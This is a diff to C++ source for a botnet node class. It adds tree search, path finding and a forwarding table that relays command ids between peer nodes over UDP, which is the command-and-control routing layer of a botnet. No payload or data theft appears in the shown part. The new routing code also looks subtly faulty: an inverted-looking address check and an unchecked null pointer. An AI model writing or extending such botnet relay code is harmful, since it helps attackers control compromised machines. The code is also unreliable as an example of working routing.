@@ -1,7 +1,7 @@
 #include "botnet.h"
 
 BotnetNode::BotnetNode()
-	:_adr({ 0,0 })
+	:_adr({ 0,0 }), _id(0)
 {
 }
 
@@ -9,10 +9,9 @@ BotnetNode::BotnetNode(
 	uint32_t ip, 
 	uint16_t port
 )
-	:_adr({ ip, port })
+	:_adr({ ip, port }), _id(0)
 {
 }
-
 
 void BotnetNode::sendNetTree(
 	const SOCKET& udp_sock,
@@ -90,8 +89,33 @@ BotnetNode* BotnetNode::findNode(
 	if (_adr.ip == addr.ip && _adr.port == addr.port)
 		return this;
 
+	BotnetNode* temp;
 	for (BotnetNode* node : _branches)
-		if (node->findNode(addr, hosts))
+	{
+		temp = node->findNode(addr, hosts);
+		if (temp)
+			return temp;
+	}
+
+	return nullptr;
+}
+
+BotnetNode* BotnetNode::findPath(
+	const adr& addr,
+	std::vector<adr>& hosts
+)
+{
+
+	if (std::find_if(hosts.begin(), hosts.end(), [=](auto host) {return host.ip == _adr.ip && host.port == _adr.port; }) != hosts.end())
+		return nullptr;
+
+	hosts.push_back(_adr);
+
+	if (_adr.ip == addr.ip && _adr.port == addr.port)
+		return this;
+
+	for (BotnetNode* node : _branches)
+		if (node->findPath(addr, hosts))
 			return node;
 
 	return nullptr;
@@ -155,4 +179,39 @@ void BotnetNode::keepAlive(
 
 		sendto(udp_sock, msg, 10, 0, (struct sockaddr*)&addr, sizeof(addr));
 	}
+}
+
+uint16_t BotnetNode::fowardCommand(
+		uint16_t command_id,
+		const struct sockaddr_in& src_addr
+)
+{
+	command_fowarding src_info;
+	src_info.src_addr.ip = src_addr.sin_addr.s_addr;
+	src_info.src_addr.port = src_addr.sin_port;
+	src_info.original_id = command_id;
+	
+	_nevigation_table[_id] = src_info;
+	return _id++;
+}
+
+struct sockaddr_in BotnetNode::nextPathNode(
+	const adr& dest_addr,
+	const adr& private_addr
+)
+{	
+	struct sockaddr_in next_node_addr;
+	std::vector<adr> hosts;
+	BotnetNode* next_node;
+	
+	if (dest_addr.ip + dest_addr.port == 0)
+		next_node = findPath(dest_addr, hosts);
+	else
+		next_node = findPath(private_addr, hosts);
+
+	next_node_addr.sin_family = AF_INET;
+	next_node_addr.sin_addr.s_addr = next_node->_adr.ip;
+	next_node_addr.sin_port = next_node->_adr.port;
+
+	return next_node_addr;
 }
